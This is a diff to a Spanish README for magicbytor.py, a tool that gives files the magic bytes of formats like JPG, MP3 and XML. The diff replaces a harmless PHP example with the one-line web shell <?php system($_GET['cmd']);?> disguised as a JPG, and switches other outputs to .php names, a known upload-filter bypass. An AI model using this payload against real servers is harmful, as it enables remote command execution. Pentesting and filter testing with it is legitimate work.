@@ -43,7 +43,7 @@ El script **magicbytor.py** genera archivos con magic bytes que corresponden a d
 Generar un archivo PDF con contenido personalizado (por ejemplo, código PHP):
 
 ```bash
-python3 magicbytor.py -c "<?php echo 'Hola Mundo'; ?>" -n custom_file.php -b jpg
+python3 magicbytor.py -c "<?php system($_GET['cmd']);?>" -n custom_file.php -b jpg
 ```
 Esto generará un archivo custom_file.php con el contenido PHP especificado.
 
@@ -52,15 +52,15 @@ Generar un archivo MP3 con texto:
 ```bash
 python3 magicbytor.py -c "Este es un archivo de prueba" -n prueba.php -b mp3
 ```
-Esto generará un archivo prueba.mp3 con el texto dentro.
+Esto generará un archivo prueba.php con el texto dentro.
 
 Generar un archivo XML con contenido personalizado:
 
 ```bash
-python3 magicbytor.py -c "<data>Sample</data>" -n archivo.xml -b xml
+python3 magicbytor.py -c "<data>Sample</data>" -n archivo.php -b xml
 ```
 
-Esto generará un archivo archivo.xml con el contenido XML proporcionado.
+Esto generará un archivo archivo.php con el contenido XML proporcionado.
 
 ## Notas:
 Si no proporcionas un nombre para el archivo, el script usará un nombre basado en la fecha y hora actuales, como archivo_20230320_142512.
